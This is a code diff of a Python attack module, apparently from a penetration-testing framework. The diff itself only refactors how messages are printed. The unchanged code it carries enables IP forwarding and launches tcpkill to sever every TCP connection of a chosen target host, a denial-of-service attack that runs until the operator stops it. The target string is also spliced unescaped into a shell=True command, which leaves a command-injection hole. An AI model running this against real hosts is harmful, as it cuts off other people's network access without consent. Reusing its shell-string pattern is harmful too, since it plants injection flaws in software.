@@ -1,5 +1,6 @@
 #        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
 
+from core.messages import *
 import time
 import os
 import subprocess
@@ -33,12 +34,12 @@ changelog = "Version 1.0:\nrelease"
 def run():
 	variables['target'][0] = variables['target'][0].replace("http://", "")
 	variables['target'][0] = variables['target'][0].replace("https://", "")
-	print(colors.blue + "[*] IP Forwarding ..." + colors.end)
+	printInfo("IP forwarding...")
 	subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	time.sleep(2)
 	command_1 = 'tcpkill -i ' + variables['interface'][0] +' -9 host ' + variables['target'][0]
 	subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-	line_3 = colors.green + "[*] Attack Has Been Started, For Stop Attack Press [enter] Key..." + colors.end
+	line_3 = colors.green + "attack has been started, for stop attack press [enter]"
 	press_ak = input(line_3)
 	os.system('killall tcpkill')
-	print(colors.bold + colors.blue + "[*] Attack Has Been Stoped." + colors.end)
+	printInfo("attack has been stoped")
